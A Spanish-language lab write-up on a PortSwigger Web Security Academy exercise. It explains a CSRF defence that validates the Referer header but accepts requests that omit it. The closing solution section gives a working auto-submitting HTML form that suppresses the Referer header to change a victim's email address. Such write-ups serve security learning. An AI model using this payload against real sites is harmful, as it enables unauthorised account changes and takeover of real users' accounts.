En este laboratorio se aprovecha una mala implementación del control de Referer como medida de protección contra ataques CSRF. Aunque la aplicación valida el encabezado Referer para asegurarse de que provenga del mismo dominio, acepta las peticiones incluso cuando este encabezado no está presente.

Mediante una metaetiqueta con name igual a referrer y content igual a no-referrer, se evita que el navegador incluya automáticamente el encabezado en la petición. Así, se logra que el servidor acepte la solicitud sin validar el origen, permitiendo cambiar el correo de la víctima sin romper ninguna política de seguridad aparente.

Este tipo de fallos demuestran cómo las medidas de seguridad basadas únicamente en encabezados pueden ser fácilmente burladas, especialmente cuando hay un fallback inseguro como en este caso.

Solucion
aqui vemos la peticion que el referer verifica que nosotro vengamos de la url correcta
![Pasted_image_20250723231034.png](/Imagenes/Pasted_image_20250723231034.png)
entonces si nosotro quitamos de alguna manera el referer podemos cambiar el correo y esto lo logramos con un payload donde con las etiquetas html y meta logramos burlarlo
(<html>
<head>
   <meta name="referrer" content="no-referrer">
</head>
<form method="POST" action="https://0a7500d50483caaf80193a2c0082006c.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<script>
        document.forms[0].submit();
</script>
</html>)

![Pasted_image_20250723231626.png](/Imagenes/Pasted_image_20250723231626.png)
![Pasted_image_20250723231951.png](/Imagenes/Pasted_image_20250723231951.png)